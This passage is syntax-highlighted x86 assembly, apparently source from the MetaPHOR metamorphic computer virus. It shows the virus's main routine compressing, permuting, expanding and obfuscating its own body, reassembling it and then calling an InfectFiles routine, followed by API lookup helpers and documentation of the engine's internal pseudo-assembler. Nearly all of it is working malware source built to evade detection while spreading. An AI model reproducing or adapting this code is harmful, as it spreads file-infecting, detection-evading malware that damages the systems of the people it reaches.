                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShrinkCode</span><span class="sc0">  </span><span class="sc1">; Compress the code</span><span class="sc0">

</span><span class="sc1">;; Variable identificator:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It scans the code to get instructions that use memory addresses and then</span><span class="sc0">
</span><span class="sc1">;; it converts them to a reference to a table of variables. After this, we</span><span class="sc0">
</span><span class="sc1">;; reselect the addresses of the variables.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VARIABLE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; Set the address to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VariableTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; table of variables</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VAR_MARKS_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; Set the buffer that marks</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VarMarksTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; the variables positions</span><span class="sc0">
                                                  </span><span class="sc1">; to know if a given address</span><span class="sc0">
                                                  </span><span class="sc1">; is already in the table</span><span class="sc0">
                                                  </span><span class="sc1">; or it's a free address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; The delta register is used</span><span class="sc0">
                                                 </span><span class="sc1">; to know what is an internal</span><span class="sc0">
                                                 </span><span class="sc1">; variable and what's not</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IdentifyVariables</span><span class="sc0">  </span><span class="sc1">; Identfy them and construct the</span><span class="sc0">
                                           </span><span class="sc1">; table of variables</span><span class="sc0">

</span><span class="sc1">;; Code permutator</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It shuffles the code and insert jumps between to link the moved blocks,</span><span class="sc0">
</span><span class="sc1">;; updating also all the labels to point to the new location.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">; Temporary buffer to construct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the permutation frames</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; Place where we store</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PermutationResult</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the permutated code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">; Buffer to store jumps to fix</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; while permutating</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PermutateCode</span><span class="sc0">
                                  </span><span class="sc1">; Permutate the code (in pseudoassembler)</span><span class="sc0">

                </span><span class="sc1">; Returns [AddressOfLastInstruction] updated to point to the</span><span class="sc0">
                </span><span class="sc1">; last instruction + 10h in [PermutationResult] address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PermutationResult</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the new instr. table</span><span class="sc0">

</span><span class="sc1">;; Code expander</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It generates alternatives for every instruction coded in our pseudo-ASM.</span><span class="sc0">
</span><span class="sc1">;; It's generated in a way that we only have to code every instruction</span><span class="sc0">
</span><span class="sc1">;; directly to have a very different look of the previous program, but keeping</span><span class="sc0">
</span><span class="sc1">;; the functionality unchanged. It also translates all registers into new</span><span class="sc0">
</span><span class="sc1">;; ones (except ESP, of course).</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Tell the expander that</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreatingADecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; we are mutating the</span><span class="sc0">
                                                      </span><span class="sc1">; virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">              </span><span class="sc1">; Set the destiny address of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExpansionResult</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; expansion/obfuscation</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Set the recursivity</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfExpansion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; to 3 (from 0 to 3)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">XpandCode</span><span class="sc0">             </span><span class="sc1">; Redo all instructions</span><span class="sc0">

                </span><span class="sc1">; Returns [AddressOfLastInstruction] updated</span><span class="sc0">

</span><span class="sc1">;; Code assembler</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It assembles the code previously obfuscated and expanded by the expander</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExpansionResult</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; _DISASM_SECTION</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; Set the address where</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; the reassembling result</span><span class="sc0">
                                                     </span><span class="sc1">; will be stored</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VARIABLE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; Use this address for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewLabelTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; temporary storadge</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">; Another buffer for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpRelocationTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; temporary storadge</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AssembleCode</span><span class="sc0">         </span><span class="sc1">; Convert the code to x86</span><span class="sc0">

</span><span class="sc1">;; Here we have:</span><span class="sc0">
</span><span class="sc1">;; [NewAssembledCode] = _DISASM2_SECTION = New code</span><span class="sc0">
</span><span class="sc1">;; [SizeOfNewCode] = Size of new code (oh, no! really??? :)</span><span class="sc0">
</span><span class="sc1">;; [RoundedSizeOfNewCode] = Size of new code rounded to pages (4 Kb)</span><span class="sc0">
</span><span class="sc1">;; From now, every section is free except CODE_SECTION, DATA_SECTION and</span><span class="sc0">
</span><span class="sc1">;;   DISASM2_SECTION.</span><span class="sc0">

</span><span class="sc1">;; Now let's make the action that gives this program the attribute of a</span><span class="sc0">
</span><span class="sc1">;; computer virus: INFECT</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">; Code the decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorPseudoCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; here in pseudo-asm</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AssembledDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Assemble it here</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; Temporary buffer for the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; FindFile functions</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; Buffer for several</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; actions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFiles</span><span class="sc0">    </span><span class="sc1">; Infect!</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return to the host and finish</span><span class="sc0">
</span><span class="sc5">Main</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to get the address of the module passed in ASCII. It will convert</span><span class="sc0">
</span><span class="sc1">;; the string to UNICODE if the GetModuleHandle function is GetModuleHandleW.</span><span class="sc0">

</span><span class="sc5">APICall_GetModuleHandle</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagAorW</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get A or W</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; A?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UseGMHA</span><span class="sc0">             </span><span class="sc1">; Then, use the string as is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">    </span><span class="sc1">; Go to the end of the string buffer (W)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">; Go to the end of the string buffer (A)</span><span class="sc0">
    </span><span class="sc5">@@LoopConvertToWideChar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get a letter</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Make it zero-extended (in words)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Decrease the ASCII address in 1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Decrease the UNICODE address in 2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Are we at the end of the buffer</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopConvertToWideChar</span><span class="sc0">  </span><span class="sc1">; If not, loop again</span><span class="sc0">
    </span><span class="sc5">@@UseGMHA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; Store parameter</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetModuleHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Call the API</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Store the module handle</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">APICall_GetModuleHandle</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; EDI = Handle of module</span><span class="sc0">
</span><span class="sc1">; EDX = Buffer where we have the function name</span><span class="sc0">
</span><span class="sc5">GetFunction</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; We do this to avoid many continuous PUSHes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Store function name and module handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call API</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the function address</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetFunction</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; KEYWORD: Key_!Disassembler</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; *********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The disassembler</span><span class="sc0">
</span><span class="sc1">;; ----------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The disassembler is the module that converts the machine code into our</span><span class="sc0">
</span><span class="sc1">;; pseudo-assembler in the addresses we gave it.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The codification of every instruction of the generated pseudo-assembler</span><span class="sc0">
</span><span class="sc1">;; is as follows (extracted from the article I wrote about metamorphism and</span><span class="sc0">
</span><span class="sc1">;; this engine):</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The MetaPHOR internal pseudo-assembler follows the next rules:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;     a) All the instructions are 16-bytes long (but this can change in the</span><span class="sc0">
</span><span class="sc1">;;      future to handle 64-bits processors, like the Itanium).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;     b) The structure of the instruction is always the same for all them:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        General structure:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        16 bytes per instruction,</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><span class="sc0">
</span><span class="sc1">;;        OP *----- instruction data ----* LM *-pointer-*</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        OP is the opcode of the instruction. Depending on the opcode we use</span><span class="sc0">
</span><span class="sc1">;;         an instruction data structure or other.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        LM is "Label Mark". Its value is 1 when a label is pointing to this</span><span class="sc0">
</span><span class="sc1">;;         instruction, and can be used for quite things, for example to know</span><span class="sc0">
</span><span class="sc1">;;         if two instructions can be shrinked or not (they can't if the second</span><span class="sc0">
</span><span class="sc1">;;         one has a label over it). It's at +0B in the instruction.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        The dword at +0C is a pointer that means "last code reference". On</span><span class="sc0">
</span><span class="sc1">;;        disassembly this means the EIP where this instruction is pointing to</span><span class="sc0">
</span><span class="sc1">;;        its original codification, but while we are advancing in the code</span><span class="sc0">
</span><span class="sc1">;;        treatment we store here references to the last situation of the</span><span class="sc0">
</span><span class="sc1">;;        instruction. This helps to make modifications to the table of labels,</span><span class="sc0">
</span><span class="sc1">;;        to recode the displacement instructions (JMP, CALL, etc.) and more.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;       Now the structures that the engine uses in the instructions:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        Memory_address_struct:</span><span class="sc0">
</span><span class="sc1">;;           +01: First index</span><span class="sc0">
</span><span class="sc1">;;           +02: Second index, bits 7&amp;6 are the multiplicator (00=*1,01=*2,</span><span class="sc0">
</span><span class="sc1">;;                                                              10=*4,11=*8)</span><span class="sc0">
</span><span class="sc1">;;           +03: DWORD addition to indexes</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        Depending on the opcode (the operation to perform), the following</span><span class="sc0">
</span><span class="sc1">;;        means:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        - If operation has no operand (NOP, RET, etc). nothing in the instr.</span><span class="sc0">
</span><span class="sc1">;;         data is performed</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        - If operation has one operand:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Register operand:</span><span class="sc0">
</span><span class="sc1">;;              +01: Register</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Memory address:</span><span class="sc0">
</span><span class="sc1">;;              +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Immediate value:</span><span class="sc0">
</span><span class="sc1">;;              +07: DWORD value, zero extended if it's a byte operation</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Destiny address (JMP, CALL, etc.)</span><span class="sc0">
</span><span class="sc1">;;              +01: Label to jump to (DWORD)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;        - If operation has two operands:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Reg,Imm:</span><span class="sc0">
</span><span class="sc1">;;              +01: Register</span><span class="sc0">
</span><span class="sc1">;;              +07: DWORD immediate value, zero extended if it's a 8-bits op.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Reg,Reg:</span><span class="sc0">
</span><span class="sc1">;;              +01: Source register</span><span class="sc0">
</span><span class="sc1">;;              +07: Destiny register</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Reg,Mem:</span><span class="sc0">
</span><span class="sc1">;;              +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;              +07: Destiny register</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Mem,Reg:</span><span class="sc0">
